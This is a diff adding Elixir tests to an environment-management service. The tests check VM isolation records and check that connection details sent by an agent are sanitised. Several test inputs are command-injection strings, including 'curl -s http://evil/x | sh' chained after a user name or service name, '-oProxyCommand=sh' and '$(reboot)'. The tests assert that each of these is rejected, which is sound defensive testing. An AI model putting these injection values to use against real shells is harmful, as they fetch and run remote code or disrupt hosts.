@@ -180,6 +180,223 @@ defmodule Foreman.EnvironmentsTest do
                })
     end
 
+    test "a VM box's result records the environment's VM", %{scope: scope, repo: repo} do
+      box = box_fixture(owner_user_id: scope.user.id, isolation: "vm")
+      connect_agent(box)
+
+      {:ok, env} =
+        Environments.create_environment(scope, %{"repo_id" => repo.id, "box_id" => box.id})
+
+      assert_receive {:dispatch, %Command{type: "env.create"} = cmd}
+      vm = %{"name" => "fm-#{env.id}", "cpus" => 4, "memory_mb" => 8192}
+      succeed(box, cmd, Map.merge(@up_result, %{"isolation" => "vm", "vm" => vm}))
+
+      env = Repo.reload!(env)
+      assert env.isolation == "vm"
+      assert env.vm == vm
+    end
+
+    test "a result without isolation means containers", %{scope: scope, repo: repo, box: box} do
+      connect_agent(box)
+
+      {:ok, env} =
+        Environments.create_environment(scope, %{"repo_id" => repo.id, "box_id" => box.id})
+
+      assert_receive {:dispatch, cmd}
+      succeed(box, cmd, @up_result)
+
+      env = Repo.reload!(env)
+      assert env.isolation == "container"
+      assert env.vm == nil
+    end
+
+    test "results carry agent data: only a VM size that fits is kept", %{
+      scope: scope,
+      user: user,
+      repo: repo,
+      box: box
+    } do
+      connect_agent(box)
+
+      for vm <- [
+            %{"name" => "fm-x", "cpus" => "lots", "memory_mb" => 8192},
+            %{"name" => "fm-x", "cpus" => 4, "memory_mb" => -1},
+            %{"name" => 7, "cpus" => 4, "memory_mb" => 8192},
+            %{"name" => "fm-x; reboot", "cpus" => 4, "memory_mb" => 8192},
+            "fm-x"
+          ] do
+        env = environment_fixture(user: user, repo: repo, box: box)
+
+        {:ok, _} = Environments.rebuild(scope, env)
+        assert_receive {:dispatch, %Command{type: "env.rebuild"} = cmd}
+        succeed(box, cmd, %{"isolation" => "vm", "vm" => vm})
+
+        assert %{isolation: "vm", vm: nil} = Repo.reload!(env)
+      end
+    end
+
+    test "extra keys in a VM size are dropped", %{scope: scope, user: user, repo: repo, box: box} do
+      connect_agent(box)
+      env = environment_fixture(user: user, repo: repo, box: box)
+
+      {:ok, _} = Environments.rebuild(scope, env)
+      assert_receive {:dispatch, %Command{type: "env.rebuild"} = cmd}
+
+      vm = %{"name" => "fm-x", "cpus" => 2, "memory_mb" => 4096}
+      succeed(box, cmd, %{"isolation" => "vm", "vm" => Map.put(vm, "notes", "hello")})
+      assert Repo.reload!(env).vm == vm
+    end
+
+    # They end up in commands people paste into a shell on the box, and
+    # on a VM box they come from inside the VM.
+    test "results carry agent data: connection details that aren't plain names are dropped", %{
+      scope: scope,
+      user: user,
+      repo: repo,
+      box: box
+    } do
+      connect_agent(box)
+
+      for {key, value} <- [
+            {"remote_user", "vscode; curl -s http://evil/x | sh"},
+            {"remote_user", "-oProxyCommand=sh"},
+            {"remote_user", "$(reboot)"},
+            {"remote_workspace_folder", "/w; reboot"},
+            {"remote_workspace_folder", "/w/$(reboot)"},
+            {"remote_workspace_folder", "/my project"},
+            {"remote_workspace_folder", "workspaces/sf"},
+            {"devcontainer_service", "x true; curl -s http://evil/x | sh; #"},
+            {"devcontainer_service", "app`reboot`"},
+            {"devcontainer_service", ""}
+          ] do
+        env =
+          environment_fixture(
+            user: user,
+            repo: repo,
+            box: box,
+            remote_user: "node",
+            workspace_folder: "/workspaces/sf"
+          )
+
+        {:ok, _} = Environments.rebuild(scope, env)
+        assert_receive {:dispatch, %Command{type: "env.rebuild"} = cmd}
+        succeed(box, cmd, Map.put(@up_result, key, value))
+
+        env = Repo.reload!(env)
+        assert env.observed_state == "running"
+        refute value in [env.remote_user, env.workspace_folder, env.devcontainer_service]
+      end
+    end
+
+    test "ordinary connection details are kept", %{
+      scope: scope,
+      user: user,
+      repo: repo,
+      box: box
+    } do
+      connect_agent(box)
+
+      for {user_name, folder, service} <- [
+            {"vscode", "/workspaces/storefront", "app"},
+            {"root", "/", "dev.container"},
+            {"node_user", "/home/node/src/my-app@2", "web_1"},
+            {"1000", "/workspaces/a.b+c", "App-2"}
+          ] do
+        env = environment_fixture(user: user, repo: repo, box: box)
+
+        {:ok, _} = Environments.rebuild(scope, env)
+        assert_receive {:dispatch, %Command{type: "env.rebuild"} = cmd}
+
+        succeed(box, cmd, %{
+          @up_result
+          | "remote_user" => user_name,
+            "remote_workspace_folder" => folder,
+            "devcontainer_service" => service
+        })
+
+        assert %{
+                 remote_user: ^user_name,
+                 workspace_folder: ^folder,
+                 devcontainer_service: ^service
+               } =
+                 Repo.reload!(env)
+      end
+    end
+
+    # A start result's size is what the agent would give a new VM (start
+    # carries no limits), not the size of the VM that started.
+    test "a start keeps the VM size recorded when the VM was made", %{user: user, repo: repo} do
+      box = box_fixture(owner_user_id: user.id, isolation: "vm")
+      connect_agent(box)
+      vm = %{"name" => "fm-x", "cpus" => 4, "memory_mb" => 8192}
+
+      env =
+        environment_fixture(
+          user: user,
+          repo: repo,
+          box: box,
+          observed_state: "stopped",
+          isolation: "vm",
+          vm: vm
+        )
+
+      {:ok, _} = Environments.start(Scope.for_user(user), env)
+      assert_receive {:dispatch, %Command{type: "env.secrets.write"} = write}
+      succeed(box, write)
+      assert_receive {:dispatch, %Command{type: "env.start"} = start}
+
+      succeed(box, start, %{
+        "isolation" => "vm",
+        "vm" => %{"name" => "fm-x", "cpus" => 16, "memory_mb" => 8192}
+      })
+
+      assert %{isolation: "vm", vm: ^vm} = Repo.reload!(env)
+    end
+
+    # An answer without isolation is from an agent that runs containers
+    # (one rolled back while the rebuild waited, say).
+    test "a rebuild that comes back as containers forgets the VM", %{
+      scope: scope,
+      user: user,
+      repo: repo
+    } do
+      box = box_fixture(owner_user_id: user.id, isolation: "vm")
+      connect_agent(box)
+
+      env =
+        environment_fixture(
+          user: user,
+          repo: repo,
+          box: box,
+          isolation: "vm",
+          vm: %{"name" => "fm-x", "cpus" => 4, "memory_mb" => 8192}
+        )
+
+      {:ok, _} = Environments.rebuild(scope, env)
+      assert_receive {:dispatch, %Command{type: "env.rebuild"} = cmd}
+      succeed(box, cmd, @up_result)
+
+      assert %{isolation: "container", vm: nil} = Repo.reload!(env)
+    end
+
+    # The agent's restart result doesn't say; the environment hasn't moved.
+    test "a restart keeps what the environment's isolation was", %{
+      scope: scope,
+      user: user,
+      repo: repo
+    } do
+      box = box_fixture(owner_user_id: user.id, isolation: "vm")
+      connect_agent(box)
+      vm = %{"name" => "fm-x", "cpus" => 4, "memory_mb" => 8192}
+      env = environment_fixture(user: user, repo: repo, box: box, isolation: "vm", vm: vm)
+
+      {:ok, _} = Environments.restart(scope, env, :all)
+      assert_receive {:dispatch, %Command{type: "env.restart"} = cmd}
+      succeed(box, cmd, @up_result)
+
+      assert %{isolation: "vm", vm: ^vm} = Repo.reload!(env)
+    end
+
     test "a failed create leaves the environment in error with the agent's message", %{
       scope: scope,
       repo: repo,
